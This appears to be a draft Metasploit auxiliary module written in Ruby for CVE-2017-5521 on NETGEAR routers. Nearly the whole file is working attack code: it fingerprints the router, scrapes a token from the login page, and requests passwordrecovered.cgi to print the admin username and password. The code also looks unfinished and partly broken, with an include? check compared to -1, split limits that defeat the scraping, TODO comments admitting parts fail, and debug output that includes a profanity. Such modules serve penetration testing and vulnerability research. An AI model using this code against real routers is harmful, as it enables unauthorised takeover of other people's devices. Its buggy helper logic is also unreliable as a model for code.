##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NETGEAR Administrator Password Disclosure',
      'Description'    => %q{
        This module will collect the the password for the `admin` user. 
        The exploit will not complete if password recovery is set on the router.
      },
      'Author'         =>
        [
          'Simon Kenin', # Vuln Discovery, PoC
          'thecarterb'   # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', 'CVE-2017-5521' ],
          [ 'URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911' ],
          [ 'URL', 'http://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],
          [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/'],
          [ 'EDB', '41205']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
    [
      OptPort::new('RPORT', [true, 'The port to connect to RHOST with', 80]),
      OptString::new('RHOST', [true, 'The router target ip address', nil])
    ], self.class)
  end

  # This is roughly ported from python 
  # 
  # But not very well apparently
  # I kind of replaced this with some regex magic
  # TODO maybe remove check()
  def scrape(text, start_trig, end_trig)
    if text.include?(start_trig) != -1
      puts "I'm scraping :D" # NOTE remove this when finished
      return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else
      return nil
    end
  end

  def run
    rhost = datastore['RHOST']
    print_status("Checking if #{rhost} is a NETGEAR router")
    
    vprint_status("Sending request to http://#{rhost}/")
    
    is_ng = check

    res = send_request_raw({ 'uri' => '/'})

    if is_ng == Exploit::CheckCode::Detected
      #token = scrape(res.to_s, "unauth.cgi?id=", "/")
      marker_one = "id="
      marker_two = "\""
      token = res.to_s[/#{marker_one}(.*?)#{marker_two}/m, 1]
      if token == nil
        print_error("#{rhost} is not vulnerable: Token not found")
        return
      end

      print_status("Token found: #{token}")
      
      r = send_request_raw({'uri' => "/passwordrecovered.cgi?id=#{token}"})
      vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
      # TODO make this work
      # rindex() doesn't seem to work
      if r.to_s.rindex('Left\">') != nil
        username = scrape(r.to_s, 'Router Admin Username</td>', '</td>')
        username = scrape(username, '>', '\'')
        password = scrape(r.to_s, 'Router Admin Password</td>', '</td>')
        password = scrape(password, '>', '\'')
        puts username
        puts password
      else # for debugging :)
        puts "fuck"
      end
    else
      return
    end
  end

  #Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response
  #This checks the response dor that header.
  def check                             #NOTE: this is working
    res = send_request_raw({'uri'=>'/'})
    
    unless res
      fail_with(Failure::Unknown, 'Connection timed out.')
    end

    data = res.to_s
    
    vprint_status("Printing response from #{datastore['RHOST']}")
    vprint_status(data)
    
    #puts data
    if data.include? "WWW-Authenticate"
      marker_one = "Basic realm=\""
      marker_two = "\""
      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
      print_good("Router is a NETGEAR router (#{model})")
      return Exploit::CheckCode::Detected
    else
      print_error('Router is not a NETGEAR router')
      return Exploit::CheckCode::Safe
    end
  
  end

end
